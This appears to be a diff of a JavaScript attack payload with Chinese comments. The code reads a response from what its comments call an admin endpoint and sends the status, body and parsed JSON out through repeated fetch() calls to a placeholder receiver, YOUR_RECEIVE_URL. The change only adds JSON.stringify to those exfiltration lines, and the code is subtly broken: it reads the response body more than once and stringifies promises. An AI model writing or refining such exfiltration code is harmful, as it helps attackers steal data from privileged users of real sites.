@@ -27,16 +27,16 @@
              fetch(YOUR_RECEIVE_URL+'?respS-='+respStatus);
             const headersArr = Array.from(res.headers.entries()).map(([key, value]) => `${key}: ${value}`);
            // fetch(YOUR_RECEIVE_URL+'?headersArr-='+headersArr);
-            const respJson = res.json();
+            const respJson = JSON.stringify(res.json());
             fetch(YOUR_RECEIVE_URL+'?respJson-='+respJson);
             
             
             // 2. 转成字符串（用换行分隔，也可以用逗号 "," 分隔）
             //const headersStr = headersArr.join('\n');
-            fetch(YOUR_RECEIVE_URL+'?res-='+res.text());
+            fetch(YOUR_RECEIVE_URL+'?res-='+JSON.stringify(res.text()));
             if (res.ok){ 
              
-                fetch(YOUR_RECEIVE_URL+'?json='+res.json());
+                fetch(YOUR_RECEIVE_URL+'?json='+JSON.stringify(res.json()));
                 return res.json();
             }; // 仅解析admin返回的合法JSON
             throw new Error('非200响应');
